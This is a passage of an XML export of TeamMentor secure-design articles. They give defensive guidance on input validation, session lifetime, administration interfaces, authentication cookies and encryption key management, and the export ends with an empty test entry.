      <Data><![CDATA[<br><h1>Description</h1><p>The preferred approach to validating input is to constrain what you allow from the beginning. It is much easier to validate data for known valid types, patterns, and ranges than it is to validate data by looking for known bad characters. When you design your application, you know what your application expects. The range of valid data is generally a more finite set than potentially malicious input. However, for defense in depth you may also want to reject known bad input and then sanitize the input.</p><p>To create an effective input validation strategy, be aware of the following approaches and their tradeoffs: </p><ul><li>Constrain input. </li><li>Validate data for type, length, format, and range. </li><li>Reject known bad input. </li><li>Sanitize input. </li></ul><h3>Constrain Input</h3><p>Constraining input is about allowing good data. This is the preferred approach. The idea here is to define a filter of acceptable input by using type, length, format, and range. Define what is acceptable input for your application fields and enforce it. Reject everything else as bad data.</p><p>Constraining input may involve setting character sets on the server so that you can establish the canonical form of the input in a localized way.</p><h3>Validate Data for Type, Length, Format, and Range</h3><p>Use strong type checking on input data wherever possible, for example, in the classes used to manipulate and process the input data and in data access routines. For example, use parameterized stored procedures for data access to benefit from strong type checking of input fields.</p><p>String fields should also be length checked and in many cases checked for appropriate format. For example, ZIP codes, personal identification numbers, and so on have well defined formats that can be validated using regular expressions. Thorough checking is not only good programming practice; it makes it more difficult for an attacker to exploit your code. The attacker may get through your type check, but the length check may make executing his favorite attack more difficult.</p><h3>Reject Known Bad Input</h3><p>Deny "bad" data; although do not rely completely on this approach. This approach is generally less effective than using the "allow" approach described earlier and it is best used in combination. To deny bad data assumes your application knows all the variations of malicious input. Remember that there are multiple ways to represent characters. This is another reason why "allow" is the preferred approach.</p><p>While useful for applications that are already deployed and when you cannot afford to make significant changes, the "deny" approach is not as robust as the "allow" approach because bad data, such as patterns that can be used to identify common attacks, do not remain constant. Valid data remains constant while the range of bad data may change over time.</p><h3>Sanitize Input</h3><p>Sanitizing is about making potentially malicious data safe. It can be helpful when the range of input that is allowed cannot guarantee that the input is safe. This includes anything from stripping a null from the end of a user-supplied string to escaping out values so they are treated as literals.</p><p>Another common example of sanitizing input in Web applications is using URL encoding or HTML encoding to wrap data and treat it as literal text rather than executable script. HtmlEncode methods escape out HTML characters, and UrlEncode methods encode a URL so that it is a valid URI request.</p><h3>In Practice</h3><p>The following are examples applied to common input fields, using the preceding approaches: </p><ul><li><strong>Last Name field</strong>. This is a good example where constraining input is appropriate In this case, you might allow string data in the range ASCII A-Z and a-z, and also hyphens and curly apostrophes (curly apostrophes have no significance to SQL) to handle names such as O'Dell. You would also limit the length to your longest expected value. </li><li><strong>Quantity field</strong>. This is another case where constraining input works well. In this example, you might use a simple type and range restriction. For example, the input data may need to be a positive integer between 0 and 1000. </li><li><strong>Free-text field</strong>. Examples include comment fields on discussion boards. In this case, you might allow letters and spaces, and also common characters such as apostrophes, commas, and hyphens. The set that is allowed does not include less than and greater than signs, brackets, and braces. </li></ul><p>Some applications might allow users to mark up their text using a finite set of script characters, such as bold "&lt;b&gt;", italic "&lt;i&gt;", or even include a link to their favorite URL. In the case of a URL, your validation should encode the value so that it is treated as a URL. </p><p>An existing Web application that does not validate user input. In an ideal scenario, the application checks for acceptable input for each field or entry point. However, if you have an existing Web application that does not validate user input, you need a stopgap approach to mitigate risk until you can improve your application's input validation strategy. While neither of the following approaches ensures safe handling of input, because that is dependent on where the input comes from and how it is used in your application, they are in practice today as quick fixes for short-term security improvement: </p><ul><li>HTML-encoding and URL-encoding user input when writing back to the client. In this case, the assumption is that no input is treated as HTML and all output is written back in a protected form. This is sanitization in action. </li><li>Rejecting malicious script characters. This is a case of rejecting known bad input. In this case, a configurable set of malicious characters is used to reject the input. As described earlier, the problem with this approach is that bad data is a matter of context. </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1621894230" Content_Hash="1919923892">
    <Metadata>
      <Id>9dbf685d-dd4f-4fe3-8395-f6a24225bf11</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Limit Session Lifetime</Title>
      <Category>Session Management</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Principle</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Description<br></h1><p>Reduce the lifetime of sessions to mitigate the risk of session hijacking and replay attacks. The shorter the session, the less time an attacker has to capture a session cookie and use it to access your application.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1893037100" Content_Hash="1770818567">
    <Metadata>
      <Id>b5ba90be-d6e2-4f37-a75a-ac31315ad990</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Protect Your Administration Interfaces</Title>
      <Category>Configuration</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Principle</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</Author>
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Description<br></h1><p>It is important that configuration management functionality is accessible only by authorized operators and administrators. A key part is to enforce strong authentication over your administration interfaces, for example, by using certificates.</p><p>If possible, limit or avoid the use of remote administration and require administrators to log on locally. If you need to support remote administration, use encrypted channels, for example, with SSL or VPN technology, because of the sensitive nature of the data passed over administrative interfaces. Also consider limiting remote administration to computers on the internal network by using <a class="create" title="Click here to create this topic" href="http://www.guidancelibrary.com/wikiedit.aspx?topic=Home.IPSec&amp;return=Home.SecurityYourAdminInterfaces">IPSec</a> policies, to further reduce risk.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1722677719" Content_Hash="355285596">
    <Metadata>
      <Id>c977bdea-a46e-4259-8266-b396efcf83b8</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Protect Authentication Cookies</Title>
      <Category>Authentication</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Principle</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<br><h1>Description</h1><p>A stolen authentication cookie is a stolen logon. Protect authentication tickets using encryption and secure communication channels. Also limit the time interval in which an authentication ticket remains valid, to counter the spoofing threat that can result from replay attacks, where an attacker captures the cookie and uses it to gain illicit access to your site. Reducing the cookie timeout does not prevent replay attacks but it does limit the amount of time the attacker has to access the site using the stolen cookie.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1154780927" Content_Hash="-2106966475">
    <Metadata>
      <Id>ea26dddc-9b25-4905-82d2-bb72801b6d20</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Protect Your Encryption Keys</Title>
      <Category>Cryptography</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Principle</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<br><h1>Description</h1><p>An encryption key is a secret number used as input to the encryption and decryption processes. For encrypted data to remain secure, the key must be protected. If an attacker compromises the decryption key, your encrypted data is no longer secure.</p><p>The following practices help secure your encryption keys: </p><ul><li>Use&nbsp;platform provided&nbsp;key management. </li><li>Cycle your keys periodically. </li></ul><p><strong>Use&nbsp;Platform Provided&nbsp;Key Management</strong></p><p>One of the major advantages of using platform provided key management is that the key management issue is handled by the operating system. For example, if you are using the .NET framework, you can use DPAPI to handle key management. The key that DPAPI uses is derived from the password that is associated with the process account that calls the DPAPI functions. You can use DPAPI to pass the burden of key management to the operating system.</p><p><strong>Cycle Your Keys Periodically</strong></p><p>Generally, a static secret is more likely to be discovered over time. Questions to keep in mind are: Did you write it down somewhere? Did Bob, the administrator with the secrets, change positions in your company or leave the company? Do not overuse keys.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1005596367" Content_Hash="-1259666805">
    <Metadata>
      <Id>f55158b5-1629-45a3-aa15-f7ed73c2449c</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Encrypt the Contents of Authentication Cookies</Title>
      <Category>Session Management</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Principle</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<br><h1>Description</h1><p>Encrypt the cookie contents even if you are using SSL. This prevents an attacker viewing or modifying the cookie if he manages to steal it through an XSS attack. In this event, the attacker could still use the cookie to access your application, but only while the cookie remains valid.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="0" Content_Hash="0">
    <Metadata>
      <Id>00000000-0000-0000-0000-00000087aad4</Id>
      <Library_Id>468f7b17-2050-436b-bffa-70e642cf70ae</Library_Id>
      <Title>test</Title>
      <Category> </Category>
      <Phase />
      <Technology> </Technology>
      <Type />
      <DirectLink>test</DirectLink>
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="false" DataType="html">
      <Data><![CDATA[]]></Data>
    </Content>
  </TeamMentor_Article>
</ArrayOfTeamMentor_Article>